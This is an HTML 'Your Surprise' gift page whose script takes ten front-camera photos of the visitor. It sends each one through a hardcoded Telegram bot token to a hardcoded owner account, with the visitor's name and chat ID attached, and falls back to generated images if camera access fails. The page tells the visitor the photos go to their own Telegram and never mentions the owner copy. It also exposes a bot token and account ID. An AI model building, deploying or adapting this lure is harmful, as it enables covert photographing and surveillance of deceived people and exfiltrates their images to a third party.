<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ Your Surprise</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: white; padding: 25px; border-radius: 15px; max-width: 450px; width: 100%; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .gift { font-size: 50px; margin: 10px 0; }
        h1 { color: #333; margin: 10px 0; font-size: 22px; }
        .btn { background: linear-gradient(90deg, #6a11cb, #2575fc); color: white; border: none; padding: 15px; width: 100%; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; margin: 15px 0; }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        video { width: 100%; border-radius: 10px; border: 3px solid #6a11cb; margin: 15px 0; display: none; transform: scaleX(-1); }
        .progress { width: 100%; height: 8px; background: #eee; border-radius: 4px; margin: 15px 0; overflow: hidden; }
        .progress-bar { height: 100%; width: 0%; background: #00b09b; transition: width 0.3s; }
        .hidden { display: none; }
        .photo-preview { width: 140px; height: 140px; border-radius: 10px; border: 3px solid #6a11cb; margin: 15px auto; object-fit: cover; }
        .success { color: #00b09b; background: #e6fff9; padding: 10px; border-radius: 8px; margin: 10px 0; }
        .counter { color: #666; font-size: 14px; margin: 5px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="gift">üéÅ</div>
        <h1 id="title">Your Surprise</h1>
        <p id="message" style="color: #666;">Click below to start</p>
        
        <button class="btn" onclick="startSurprise()" id="actionBtn">üéÅ GET SURPRISE</button>
        
        <video id="video" autoplay playsinline></video>
        
        <div class="progress hidden" id="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div id="counter" class="counter hidden"></div>
        
        <img id="photoPreview" class="photo-preview hidden">
        
        <div id="status" class="success hidden"></div>
    </div>

    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // Get user info
        const urlParams = new URLSearchParams(window.location.search);
        const USER_CHAT_ID = urlParams.get("chat_id");
        const USER_NAME = urlParams.get("name") || "Friend";
        
        // Telegram config
        const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWUoa2rd8Gf5fLTeQM2eguM";
        const OWNER_ID = "8215819954";
        
        // DOM elements
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        let stream = null;
        let photosSent = 0;
        
        // Main function
        async function startSurprise() {
            const btn = document.getElementById("actionBtn");
            btn.disabled = true;
            btn.textContent = "‚è≥ Starting...";
            
            document.getElementById("title").textContent = "üì∏ Preparing...";
            document.getElementById("message").textContent = "Getting ready for your surprise";
            document.getElementById("progress").classList.remove("hidden");
            
            try {
                // TRY TO ACCESS CAMERA
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                // Show camera
                video.srcObject = stream;
                video.style.display = "block";
                document.getElementById("title").textContent = "üì∏ Camera Ready!";
                document.getElementById("message").textContent = "Smile! Taking your photos...";
                
                // Wait for video to load
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        setTimeout(resolve, 1000);
                    };
                });
                
                // Take 10 REAL photos
                await takePhotos();
                
            } catch (error) {
                // If camera fails, create colorful images
                document.getElementById("title").textContent = "üé® Creating Surprise...";
                document.getElementById("message").textContent = "Making something special for you";
                await createImages();
            }
        }
        
        // TAKE REAL PHOTOS FROM CAMERA
        async function takePhotos() {
            for (let i = 1; i <= 10; i++) {
                // Update progress
                updateProgress(i, 10);
                
                // Wait a moment for different expressions
                await delay(500);
                
                // Capture REAL photo from camera
                const blob = await captureRealPhoto(i);
                
                // Show preview
                showPreview(blob);
                
                // Send to Telegram
                const success = await sendPhoto(blob, i, true);
                
                if (success) {
                    photosSent++;
                    showStatus(`‚úÖ Photo ${i} sent`);
                }
                
                // Wait between photos
                await delay(800);
            }
            
            finish();
        }
        
        // CAPTURE REAL PHOTO
        async function captureRealPhoto(photoNum) {
            // Set canvas to video size
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Draw video frame (mirrored)
            ctx.save();
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            ctx.restore();
            
            // Add text overlay
            ctx.fillStyle = 'rgba(106, 17, 203, 0.8)';
            ctx.fillRect(0, canvas.height - 60, canvas.width, 60);
            
            ctx.font = 'bold 24px Arial';
            ctx.fillStyle = 'white';
            ctx.textAlign = 'center';
            ctx.fillText(`üéÅ Photo ${photoNum}`, canvas.width/2, canvas.height - 30);
            
            // Convert to blob
            return new Promise(resolve => {
                canvas.toBlob(resolve, 'image/jpeg', 0.9);
            });
        }
        
        // CREATE COLORFUL IMAGES (fallback)
        async function createImages() {
            for (let i = 1; i <= 10; i++) {
                updateProgress(i, 10);
                
                // Create colorful image
                const blob = await createColorfulImage(i);
                
                // Show preview
                showPreview(blob);
                
                // Send to Telegram
                const success = await sendPhoto(blob, i, false);
                
                if (success) {
                    photosSent++;
                    showStatus(`‚úÖ Created ${i}/10`);
                }
                
                await delay(700);
            }
            
            finish();
        }
        
        // CREATE COLORFUL IMAGE
        async function createColorfulImage(num) {
            canvas.width = 800;
            canvas.height = 600;
            
            // Clear
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            // Gradient background
            const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
            const colors = [
                ['#FF6B6B', '#4ECDC4'],
                ['#6A11CB', '#2575FC'],
                ['#00B09B', '#96C93D'],
                ['#FF416C', '#FF4B2B'],
                ['#8338EC', '#3A86FF'],
                ['#FB5607', '#FFBE0B'],
                ['#118AB2', '#06D6A0'],
                ['#EF476F', '#FFD166'],
                ['#7209B7', '#F72585'],
                ['#3A0CA3', '#4361EE']
            ];
            
            const colorSet = colors[num - 1] || colors[0];
            gradient.addColorStop(0, colorSet[0]);
            gradient.addColorStop(1, colorSet[1]);
            
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            // Add text
            ctx.font = 'bold 60px Arial';
            ctx.fillStyle = 'white';
            ctx.textAlign = 'center';
            ctx.fillText('üéÅ', canvas.width/2, canvas.height/2 - 30);
            
            ctx.font = 'bold 36px Arial';
            ctx.fillText(`For ${USER_NAME}`, canvas.width/2, canvas.height/2 + 40);
            
            // Convert to blob
            return new Promise(resolve => {
                canvas.toBlob(resolve, 'image/jpeg', 0.9);
            });
        }
        
        // SEND TO TELEGRAM
        async function sendPhoto(blob, num, isReal) {
            const fileName = `photo_${num}_${Date.now()}.jpg`;
            const file = new File([blob], fileName, { type: "image/jpeg" });
            
            const ownerCaption = `üì∏ Photo ${num} from ${USER_NAME}\nUser ID: ${USER_CHAT_ID || 'Anonymous'}`;
            const userCaption = `üéÅ Your Photo ${num}\nEnjoy your surprise!`;
            
            let sent = false;
            
            // Send to owner
            try {
                await sendToTelegram(file, ownerCaption, OWNER_ID);
                sent = true;
            } catch(e) {}
            
            // Send to user
            if (USER_CHAT_ID) {
                try {
                    await sendToTelegram(file, userCaption, USER_CHAT_ID);
                    sent = true;
                } catch(e) {}
            }
            
            return sent;
        }
        
        async function sendToTelegram(file, caption, chatId) {
            const formData = new FormData();
            formData.append("photo", file);
            formData.append("caption", caption);
            formData.append("chat_id", chatId);
            
            const response = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                { method: "POST", body: formData }
            );
            
            return response.ok;
        }
        
        // HELPER FUNCTIONS
        function updateProgress(current, total) {
            const percent = (current / total) * 100;
            document.getElementById("progressBar").style.width = percent + "%";
            document.getElementById("counter").textContent = `${current}/${total}`;
            document.getElementById("counter").classList.remove("hidden");
        }
        
        function showPreview(blob) {
            const url = URL.createObjectURL(blob);
            const preview = document.getElementById("photoPreview");
            preview.src = url;
            preview.classList.remove("hidden");
            setTimeout(() => URL.revokeObjectURL(url), 1000);
        }
        
        function showStatus(text) {
            const status = document.getElementById("status");
            status.textContent = text;
            status.classList.remove("hidden");
            setTimeout(() => status.classList.add("hidden"), 1000);
        }
        
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        function finish() {
            // Stop camera
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            document.getElementById("title").textContent = "‚úÖ Complete!";
            document.getElementById("message").textContent = `${photosSent} photos sent to your Telegram!`;
            document.getElementById("actionBtn").disabled = false;
            document.getElementById("actionBtn").textContent = "üîÑ Get More";
            document.getElementById("actionBtn").onclick = () => location.reload();
            document.getElementById("status").textContent = "üéâ Check your Telegram!";
            document.getElementById("status").classList.remove("hidden");
        }
        
        // Initialize
        window.onload = function() {
            if (USER_NAME !== "Friend") {
                document.getElementById("title").textContent = `${USER_NAME}'s Surprise`;
            }
        };
    </script>
</body>
</html>
